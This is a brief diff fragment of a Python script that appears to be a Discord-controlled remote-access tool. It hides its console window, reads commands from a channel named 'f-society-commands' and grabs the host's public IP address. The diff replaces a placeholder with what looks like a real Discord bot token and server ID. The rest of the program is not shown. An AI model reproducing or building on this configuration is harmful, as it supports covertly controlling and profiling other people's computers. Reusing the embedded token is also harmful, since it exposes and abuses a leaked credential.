@@ -30,8 +30,8 @@ def hide_console():
 hide_console()
 
 # ==================== CONFIGURATION ====================
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"  # Same token for both
-GUILD_ID = 123456789012345678       # Your Discord server ID
+BOT_TOKEN = "MTUwMjY3MjE1NDEwNDQzMDgwMw.Gm_swp.AE__98khtTRTxmcL9GFfe-gKfYwpsvx4IH4zxA"  # Same token for both
+GUILD_ID = 1502665189269573823       # Your Discord server ID
 CHANNEL_NAME = "f-society-commands" # Main command channel
 
 PC_IP = requests.get('https://api.ipify.org', timeout=5).text
